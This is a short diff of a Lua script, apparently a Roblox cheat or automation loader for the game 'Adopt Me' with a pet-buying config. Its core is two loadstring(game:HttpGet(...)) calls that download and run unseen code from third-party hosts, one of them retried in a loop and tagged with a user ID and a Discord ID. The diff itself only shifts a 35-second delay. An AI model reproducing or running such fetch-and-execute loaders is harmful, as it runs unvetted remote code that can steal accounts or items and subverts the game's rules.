@@ -1,4 +1,5 @@
 task.spawn(function()
+    task.wait(35)
     SCRIPT_KEY="WorkFine";
     getgenv().Config = {
         ["PetAMountToBuy"] = "0", -- can be 999
@@ -60,6 +61,5 @@ task.spawn(function()
     }
     loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/0834ed3339177583768e0ac89322132c4ff6158a050d196a7274977f95628d01/download"))()
 
-task.spawn(function()
-    task.wait(35)    
+task.spawn(function()   
     _G.Config={UserID="872abb63-44f8-4582-8ee9-0b202051bf94",discord_id="943761757288169493",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/adoptmee"))()end)if s then break end wait(5)end
